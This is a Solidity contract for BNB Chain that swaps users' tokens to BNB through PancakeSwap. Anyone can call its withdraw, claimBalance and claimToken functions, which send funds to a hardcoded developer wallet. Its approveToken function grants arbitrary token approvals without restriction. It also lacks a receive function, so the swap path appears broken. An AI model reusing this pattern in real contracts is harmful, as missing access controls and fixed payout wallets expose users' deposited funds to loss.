/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IPancakeRouter02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TokenRemixer {
    address private constant PANCAKESWAP_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private DEAD_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address payable private devAddress = payable(0xb68069821594a1d1E33b30e5ed28c98B97BE0895);

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    function mixToken(address token, uint256 amount) external {
    IERC20(token).transferFrom(msg.sender, address(this), amount);

    address[] memory path = new address[](2);
    path[0] = token;
    path[1] = IPancakeRouter02(PANCAKESWAP_ROUTER).WETH();

    IERC20(token).approve(PANCAKESWAP_ROUTER, amount);
    IPancakeRouter02(PANCAKESWAP_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens{gas: 500000}(
        amount,
        0,
        path,
        address(this),
        block.timestamp
    );

    payable(msg.sender).transfer(address(this).balance);
    }


    function approveToken(address token, address spender, uint256 amount) external  {
         IERC20(token).approve(spender, amount);
    }

    function withdraw() external {
        payable(devAddress).transfer(address(this).balance);
    }

    function claimBalance() external {
       payable(devAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external  {
       IERC20(token).transfer(devAddress, amount);
    }

    function setDeadAddress(address newAddress) external onlyOwner {
        DEAD_ADDRESS = newAddress;
    }

    function transferBalance(address payable recipient, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient balance");

        recipient.transfer(amount);
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function kill() external onlyOwner {
        selfdestruct(payable(owner));
    }
}